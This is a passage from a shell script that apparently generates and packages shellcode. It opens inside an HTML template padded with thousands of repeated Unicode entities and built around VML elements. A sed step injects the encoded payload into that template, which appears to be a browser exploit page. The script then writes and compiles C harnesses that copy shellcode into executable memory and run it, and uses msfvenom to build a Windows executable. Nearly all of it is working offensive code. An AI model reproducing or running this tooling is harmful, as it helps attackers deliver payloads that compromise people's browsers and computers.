#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;" ></v:rect></v:fill></body>
</html>
                                                                                                                                                   
EOF

cat $template.tmp | sed s/"insertpayloadhere"/"`cat $filename.unicode`"/ > $template
rm -f $template.tmp
	
fi


if [ "$format" == "macho64" ]
then
	printf "%-${outputchars}s" "Creating $format shellcode test program"
	printf "%-${outputchars}s\n" "[$filename.shellcodetest.c]"

	echo '#include <stdio.h>' >> $filename.shellcodetest.c
	echo '#include <sys/mman.h>' >> $filename.shellcodetest.c
	echo '#include <string.h>' >> $filename.shellcodetest.c
	echo '#include <stdlib.h>' >> $filename.shellcodetest.c
	echo 'int (*sc)();' >> $filename.shellcodetest.c
	echo -n 'char shellcode[] = "' >> $filename.shellcodetest.c
	cat $filename.shellcode >> $filename.shellcodetest.c
	echo '";' >> $filename.shellcodetest.c
	echo 'int main(int argc, char **argv) {' >> $filename.shellcodetest.c
	echo '    void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON' >> $filename.shellcodetest.c
	echo '            | MAP_PRIVATE, -1, 0);' >> $filename.shellcodetest.c
	echo '    if (ptr == MAP_FAILED) {' >> $filename.shellcodetest.c
	echo '        perror("mmap");' >> $filename.shellcodetest.c
	echo '        exit(-1);' >> $filename.shellcodetest.c
	echo '    }' >> $filename.shellcodetest.c
	echo '    memcpy(ptr, shellcode, sizeof(shellcode));' >> $filename.shellcodetest.c
	echo '    sc = ptr;' >> $filename.shellcodetest.c
	echo '    sc();' >> $filename.shellcodetest.c
	echo '    return 0;' >> $filename.shellcodetest.c
	echo '}' >> $filename.shellcodetest.c

	printf "%-${outputchars}s" "Compiling $format shellcode test program"
	printf "%-${outputchars}s\n" "[$GCC -o $filename.shellcodetest$extension $filename.shellcodetest.c]"

	$GCC -o $filename.shellcodetest$extension $filename.shellcodetest.c

elif [ "$format" == "win64" ]
then
	printf "%-${outputchars}s" "Shellcode test program not used for $format"
	printf "%-${outputchars}s\n" "[n/a]"

	printf "%-${outputchars}s" "Generating $format shellcode test program"
	printf "%-${outputchars}s\n" "[cat $filename.raw | msfvenom -f exe -a x64 --platform windows > $filename.shellcodetest$extension]"

	cat $filename.raw | msfvenom -f exe -a x64 --platform windows > $filename.shellcodetest$extension

else
	printf "%-${outputchars}s" "Creating $format shellcode test program"
	printf "%-${outputchars}s\n" "[$filename.shellcodetest.c]"

	echo -n 'char code[] = "' >> $filename.shellcodetest.c
	cat $filename.shellcode >> $filename.shellcodetest.c
	echo '";' >> $filename.shellcodetest.c
	echo 'int main(int argc, char **argv)' >> $filename.shellcodetest.c
	echo '{' >> $filename.shellcodetest.c
	echo '	int (*func)();' >> $filename.shellcodetest.c
	echo '	func = (int (*)()) code;' >> $filename.shellcodetest.c
	echo '	(int)(*func)();' >> $filename.shellcodetest.c
	echo '}' >> $filename.shellcodetest.c

	printf "%-${outputchars}s" "Compiling $format shellcode test program"
	printf "%-${outputchars}s\n" "[$GCC -o $filename.shellcodetest$extension $filename.shellcodetest.c]"

	$GCC -o $filename.shellcodetest$extension $filename.shellcodetest.c

fi

echo
printf "Successfully created "
shellcode_size $filename.shellcode
printf " byte shellcode. You should now be able to execute:\n\n./$filename.shellcodetest$extension\n\n"
echo

exit


